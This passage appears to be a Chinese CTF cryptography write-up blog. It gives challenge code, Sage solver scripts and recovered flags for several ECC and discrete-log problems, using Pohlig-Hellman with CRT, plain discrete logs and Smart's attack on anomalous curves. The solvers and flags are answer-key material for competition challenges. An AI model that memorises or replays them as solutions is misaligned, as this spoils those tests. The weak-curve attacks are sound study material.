0xc6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66</span><br><span class="line">Gy: 0x11839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650</span><br><span class="line">e: 0x10001</span><br><span class="line">p * q: 0x118aaa1add80bdd0a1788b375e6b04426c50bb3f9cae0b173b382e3723fc858ce7932fb499cd92f5f675d4a2b05d2c575fc685f6cf08a490d6c6a8a6741e8be4572adfcba233da791ccc0aee033677b72788d57004a776909f6d699a0164af514728431b5aed704b289719f09d591f5c1f9d2ed36a58448a9d57567bd232702e9b28f</span><br><span class="line">ciphertext: 0x3862c872480bdd067c0c68cfee4527a063166620c97cca4c99baff6eb0cf5d42421b8f8d8300df5f8c7663adb5d21b47c8cb4ca5aab892006d7d44a1c5b5f5242d88c6e325064adf9b969c7dfc52a034495fe67b5424e1678ca4332d59225855b7a9cb42db2b1db95a90ab6834395397e305078c5baff78c4b7252d7966365afed9e</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用 <code>n = Q.x*Q.y</code><br>且(Q.x,Q.y)在曲线上来联立求解<br>这里我们构造 <code>(Q.x*Q.y)^2-n^2===0 mod P</code> 来求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">P = <span class="number">0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line">a = -<span class="number">0x3</span></span><br><span class="line">b = <span class="number">0x51953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00</span></span><br><span class="line">Gx = <span class="number">0xc6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66</span></span><br><span class="line">Gy = <span class="number">0x11839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">0x118aaa1add80bdd0a1788b375e6b04426c50bb3f9cae0b173b382e3723fc858ce7932fb499cd92f5f675d4a2b05d2c575fc685f6cf08a490d6c6a8a6741e8be4572adfcba233da791ccc0aee033677b72788d57004a776909f6d699a0164af514728431b5aed704b289719f09d591f5c1f9d2ed36a58448a9d57567bd232702e9b28f</span></span><br><span class="line">c = <span class="number">0x3862c872480bdd067c0c68cfee4527a063166620c97cca4c99baff6eb0cf5d42421b8f8d8300df5f8c7663adb5d21b47c8cb4ca5aab892006d7d44a1c5b5f5242d88c6e325064adf9b969c7dfc52a034495fe67b5424e1678ca4332d59225855b7a9cb42db2b1db95a90ab6834395397e305078c5baff78c4b7252d7966365afed9e</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># E = EllipticCurve(GF(P),a,b)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PR.&lt;x&gt; = PolynomialRing(Zmod(P))</span></span><br><span class="line"><span class="comment"># f = (x^3+a*x+b)*(x^2)-n^2</span></span><br><span class="line"><span class="comment"># f = f.monic()</span></span><br><span class="line"><span class="comment"># for root in f.roots():</span></span><br><span class="line"><span class="comment">#     if(is_prime(root[0])):</span></span><br><span class="line"><span class="comment">#         print(root[0])</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">4573744216059593260686660411936793507327994800883645562370166075007970317346237399760397301505506131100113886281839847419425482918932436139080837246914736557</span></span><br><span class="line">q = n//p</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> modinv</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">d = modinv(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"><span class="comment"># watevr&#123;factoring_polynomials_over_finite_fields_is_too_ez&#125;</span></span><br></pre></td></tr></table></figure><h2 id="第五空间2021-ecc"><a href="#第五空间2021-ecc" class="headerlink" title="第五空间2021 ecc"></a>第五空间2021 ecc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Try to solve the 3 ECC&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">assert</span>(flag[:<span class="number">5</span>]==<span class="string">&#x27;flag&#123;&#x27;</span>)</span><br><span class="line">flag = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line">num1 = bytes_to_long(flag[:<span class="number">7</span>])</span><br><span class="line">num2 = bytes_to_long(flag[<span class="number">7</span>:<span class="number">14</span>])</span><br><span class="line">num3 = bytes_to_long(flag[<span class="number">14</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ECC1</span>(<span class="params">num</span>):</span><br><span class="line">p = <span class="number">146808027458411567</span></span><br><span class="line">A = <span class="number">46056180</span></span><br><span class="line">B = <span class="number">2316783294673</span></span><br><span class="line">E = EllipticCurve(GF(p),[A,B])</span><br><span class="line">P = E.random_point() </span><br><span class="line">Q = num*P</span><br><span class="line"><span class="built_in">print</span> E</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;P:&#x27;</span>,P</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Q:&#x27;</span>,Q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ECC2</span>(<span class="params">num</span>):</span><br><span class="line">p = <span class="number">1256438680873352167711863680253958927079458741172412327087203</span></span><br><span class="line"><span class="comment">#import random</span></span><br><span class="line"><span class="comment">#A = random.randrange(389718923781273978681723687163812)</span></span><br><span class="line"><span class="comment">#B = random.randrange(816378675675716537126387613131232121431231)</span></span><br><span class="line">A = <span class="number">377999945830334462584412960368612</span></span><br><span class="line">B = <span class="number">604811648267717218711247799143415167229480</span></span><br><span class="line">E = EllipticCurve(GF(p),[A,B])</span><br><span class="line">P = E.random_point() </span><br><span class="line">Q = num*P</span><br><span class="line"><span class="built_in">print</span> E</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;P:&#x27;</span>,P</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Q:&#x27;</span>,Q</span><br><span class="line">factors, exponents = <span class="built_in">zip</span>(*factor(E.order()))</span><br><span class="line">primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span> primes</span><br><span class="line">dlogs = []</span><br><span class="line"><span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">t = <span class="built_in">int</span>(<span class="built_in">int</span>(P.order()) / <span class="built_in">int</span>(fac))</span><br><span class="line">dlog = discrete_log(t*Q,t*P,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">dlogs += [dlog]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;factor: &quot;</span>+<span class="built_in">str</span>(fac)+<span class="string">&quot;, Discrete Log: &quot;</span>+<span class="built_in">str</span>(dlog)) <span class="comment">#calculates discrete logarithm for each prime order</span></span><br><span class="line"><span class="built_in">print</span> num</span><br><span class="line"><span class="built_in">print</span> crt(dlogs,primes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ECC3</span>(<span class="params">num</span>):</span><br><span class="line">p = <span class="number">0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1b</span></span><br><span class="line">A = <span class="number">0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07</span></span><br><span class="line">B = <span class="number">0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2</span></span><br><span class="line">E = EllipticCurve(GF(p),[A,B])</span><br><span class="line">P = E.random_point() </span><br><span class="line">Q = num*P</span><br><span class="line"><span class="built_in">print</span> E</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;P:&#x27;</span>,P</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Q:&#x27;</span>,Q</span><br><span class="line"></span><br><span class="line">ECC1(num1)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;==============&#x27;</span></span><br><span class="line">ECC2(num2)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;==============&#x27;</span></span><br><span class="line">ECC3(num3)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>三层ECC<br>第一部分: 数据都很小直接离散对数求解<br>第二部分: 题目已经帮我们实现了当曲线的阶可以分解时 可以用CRT+DLP来求解<br>第三部分: 曲线的阶和p相等 SmartAttack</p><p>第一部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p1 = <span class="number">146808027458411567</span></span><br><span class="line">A1 = <span class="number">46056180</span></span><br><span class="line">B1 = <span class="number">2316783294673</span></span><br><span class="line">E1 = EllipticCurve(GF(p1),[A1,B1])</span><br><span class="line">P1 = E1(<span class="number">119851377153561800</span>,<span class="number">50725039619018388</span>)</span><br><span class="line">Q1 = E1(<span class="number">22306318711744209</span>,<span class="number">111808951703508717</span>)</span><br><span class="line"></span><br><span class="line">num1 = discrete_log(Q1,P1,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(num1)</span><br><span class="line"><span class="comment"># num1 = 13566003730592612</span></span><br></pre></td></tr></table></figure><p>第二部分<br><a href="http://www.leonlist.top/2020/09/29/CTF%E5%AF%86%E7%A0%81%E5%AD%A6-ECC/" target="_blank">原理</a><br>代码(模板直接套)<br>这里发现好多模板都是对E的阶分解 但是看原理是跟P的阶有关啊 这道题我换成用P的阶完全正确(…) 等多做几道题再来商榷(应该是默认P是E的生成元吧)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">p2 = <span class="number">1256438680873352167711863680253958927079458741172412327087203</span></span><br><span class="line">A2 = <span class="number">377999945830334462584412960368612</span></span><br><span class="line">B2 = <span class="number">604811648267717218711247799143415167229480</span></span><br><span class="line">E2 = EllipticCurve(GF(p2),[A2,B2])</span><br><span class="line">P2 = E2(<span class="number">550637390822762334900354060650869238926454800955557622817950</span>,<span class="number">700751312208881169841494663466728684704743091638451132521079</span>)</span><br><span class="line">Q2 = E2(<span class="number">1152079922659509908913443110457333432642379532625238229329830</span>,<span class="number">819973744403969324837069647827669815566569448190043645544592</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">P,Q,E</span>):</span><br><span class="line">    factors, exponents = <span class="built_in">zip</span>(*factor(P.order())) <span class="comment"># P or E?</span></span><br><span class="line">    primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(primes)</span><br><span class="line">    dlogs = []</span><br><span class="line">    <span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="built_in">int</span>(P.order()) // <span class="built_in">int</span>(fac))</span><br><span class="line">        dlog = discrete_log(t*Q,t*P,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">        dlogs += [dlog]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;factor: &quot;</span>+<span class="built_in">str</span>(fac)+<span class="string">&quot;, Discrete Log: &quot;</span>+<span class="built_in">str</span>(dlog)) <span class="comment">#calculates discrete logarithm for each prime order</span></span><br><span class="line">    m = CRT_list(dlogs,primes)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">num2 = solve(P2,Q2,E2)</span><br><span class="line"><span class="comment"># num2 = 16093767336603949</span></span><br></pre></td></tr></table></figure><p>第三部分<br>SmartAttack<br>模板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">p3 = <span class="number">0xd3ceec4c84af8fa5f3e9af91e00cabacaaaecec3da619400e29a25abececfdc9bd678e2708a58acb1bd15370acc39c596807dab6229dca11fd3a217510258d1b</span></span><br><span class="line">A3 = <span class="number">0x95fc77eb3119991a0022168c83eee7178e6c3eeaf75e0fdf1853b8ef4cb97a9058c271ee193b8b27938a07052f918c35eccb027b0b168b4e2566b247b91dc07</span></span><br><span class="line">B3 = <span class="number">0x926b0e42376d112ca971569a8d3b3eda12172dfb4929aea13da7f10fb81f3b96bf1e28b4a396a1fcf38d80b463582e45d06a548e0dc0d567fc668bd119c346b2</span></span><br><span class="line">E3 = EllipticCurve(GF(p3),[A3,B3])</span><br><span class="line">P3 = E3(<span class="number">10121571443191913072732572831490534620810835306892634555532657696255506898960536955568544782337611042739846570602400973952350443413585203452769205144937861</span> ,<span class="number">8425218582467077730409837945083571362745388328043930511865174847436798990397124804357982565055918658197831123970115905304092351218676660067914209199149610</span> )</span><br><span class="line">Q3 = E3(<span class="number">964864009142237137341389653756165935542611153576641370639729304570649749004810980672415306977194223081235401355646820597987366171212332294914445469010927</span> ,<span class="number">5162185780511783278449342529269970453734248460302908455520831950343371147566682530583160574217543701164101226640565768860451999819324219344705421407572537</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(p3 == E3.order())</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P,Q,p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line">num3 = SmartAttack(P3,Q3,p3)</span><br><span class="line"><span class="comment"># num3 = 19597596255129283097357413993866074145935170485891892</span></span><br></pre></td></tr></table></figure><p>这道题对应的3个part也是ECC很常见的3种攻击方法 要熟练掌握 运用</p><h2 id="领航杯江苏省赛2021-ECC"><a href="#领航杯江苏省赛2021-ECC" class="headerlink" title="领航杯江苏省赛2021 ECC"></a>领航杯江苏省赛2021 ECC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = <span class="number">64464091191308356774703439660771627086045800299627641179047457478059588557461</span></span><br><span class="line">a = <span class="number">31926335967105564755113987930261069322507794703287741857397622356704769886356</span></span><br><span class="line">b = <span class="number">34835808070187351680507689900273321615070127680320357724483770400791707112940</span></span><br><span class="line">Gx = <span class="number">2053202552422630348010474635096983783565667661786369125783579647572276572403</span></span><br><span class="line">Gy = <span class="number">51320753844844801021362329076409450910659564359017581255542897537756778371539</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">&quot;CnHongKe&#123;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">k = bytes_to_long(flag[<span class="number">9</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">assert</span> k &lt; <span class="number">32000000000000000000000000000</span></span><br><span class="line"></span><br><span class="line">Zp = Zmod(P)</span><br><span class="line">EC = EllipticCurve(Zp, [a, b])</span><br><span class="line">G = EC(Gx, Gy)</span><br><span class="line">K = k * G</span><br><span class="line"><span class="built_in">print</span> K</span><br><span class="line"></span><br><span class="line"><span class="comment"># (31981799071949968743482831587417174146463993877255771340814476669214408840460 : 15144025062588325012239455117890516531350002058200271280110877844265896081387 : 1)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这种没给额外条件的联想到用CRT+PH来解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">64464091191308356774703439660771627086045800299627641179047457478059588557461</span></span><br><span class="line">a = <span class="number">31926335967105564755113987930261069322507794703287741857397622356704769886356</span></span><br><span class="line">b = <span class="number">34835808070187351680507689900273321615070127680320357724483770400791707112940</span></span><br><span class="line">Gx = <span class="number">2053202552422630348010474635096983783565667661786369125783579647572276572403</span></span><br><span class="line">Gy = <span class="number">51320753844844801021362329076409450910659564359017581255542897537756778371539</span></span><br><span class="line">E = EllipticCurve(Zmod(p), [a, b])</span><br><span class="line">K = (<span class="number">31981799071949968743482831587417174146463993877255771340814476669214408840460</span> , <span class="number">15144025062588325012239455117890516531350002058200271280110877844265896081387</span>)</span><br><span class="line">K = E(K)</span><br><span class="line">G = E((Gx,Gy))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">P,Q,E</span>):</span><br><span class="line">    factors, exponents = <span class="built_in">zip</span>(*factor(P.order())) <span class="comment"># P or E?</span></span><br><span class="line">    primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(primes)</span><br><span class="line">    dlogs = []</span><br><span class="line">    <span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="built_in">int</span>(P.order()) // <span class="built_in">int</span>(fac))</span><br><span class="line">        dlog = discrete_log(t*Q,t*P,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">        dlogs += [dlog]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;factor: &quot;</span>+<span class="built_in">str</span>(fac)+<span class="string">&quot;, Discrete Log: &quot;</span>+<span class="built_in">str</span>(dlog)) <span class="comment">#calculates discrete logarithm for each prime order</span></span><br><span class="line">    m = CRT_list(dlogs,primes)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">num2 = solve(G,K,E)</span><br><span class="line"><span class="built_in">print</span>(num2)</span><br></pre></td></tr></table></figure><p>解出来 11000838085296873931177<br>但是发现bit数不够 说明是一个特解 我们枚举一下求flag<br>求得P的阶后利用阶的性质来枚举</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">64464091191308356774703439660771627086045800299627641179047457478059588557461</span></span><br><span class="line">a = <span class="number">31926335967105564755113987930261069322507794703287741857397622356704769886356</span></span><br><span class="line">b = <span class="number">34835808070187351680507689900273321615070127680320357724483770400791707112940</span></span><br><span class="line">Gx = <span class="number">2053202552422630348010474635096983783565667661786369125783579647572276572403</span></span><br><span class="line">Gy = <span class="number">51320753844844801021362329076409450910659564359017581255542897537756778371539</span></span><br><span class="line">E = EllipticCurve(Zmod(p), [a, b])</span><br><span class="line">K = (<span class="number">31981799071949968743482831587417174146463993877255771340814476669214408840460</span> , <span class="number">15144025062588325012239455117890516531350002058200271280110877844265896081387</span>)</span><br><span class="line">K = E(K)</span><br><span class="line">G = E((Gx,Gy))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">P,Q,E</span>):</span><br><span class="line">    factors, exponents = <span class="built_in">zip</span>(*factor(P.order())) <span class="comment"># P or E?</span></span><br><span class="line">    primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(primes)</span><br><span class="line">    dlogs = []</span><br><span class="line">    <span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">        t = <span class="built_in">int</span>(<span class="built_in">int</span>(P.order()) // <span class="built_in">int</span>(fac))</span><br><span class="line">        dlog = discrete_log(t*Q,t*P,operation=<span class="string">&quot;+&quot;</span>)</span><br><span class="line">        dlogs += [dlog]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;factor: &quot;</span>+<span class="built_in">str</span>(fac)+<span class="string">&quot;, Discrete Log: &quot;</span>+<span class="built_in">str</span>(dlog)) <span class="comment">#calculates discrete logarithm for each prime order</span></span><br><span class="line">    m = CRT_list(dlogs,primes)</span><br><span class="line">    n = prod(primes)</span><br><span class="line">    <span class="keyword">return</span> m,n</span><br><span class="line"></span><br><span class="line">num2,n = solve(G,K,E)</span><br><span class="line">num2 = <span class="number">11000838085296873931177</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> trange(<span class="number">2</span>^<span class="number">21</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    num = num2+k*n</span><br><span class="line">    <span class="keyword">if</span> num*G==K:</span><br><span class="line">        <span class="built_in">print</span>((<span class="built_in">int</span>(num)))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 31685206468414518702878516593</span></span><br><span class="line"><span class="comment"># factor_ordeq</span></span><br></pre></td></tr></table></figure><h2 id="广东强网杯2021团队组-DLP"><a href="#广东强网杯2021团队组-DLP" class="headerlink" title="广东强网杯2021团队组 DLP"></a>广东强网杯2021团队组 DLP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span 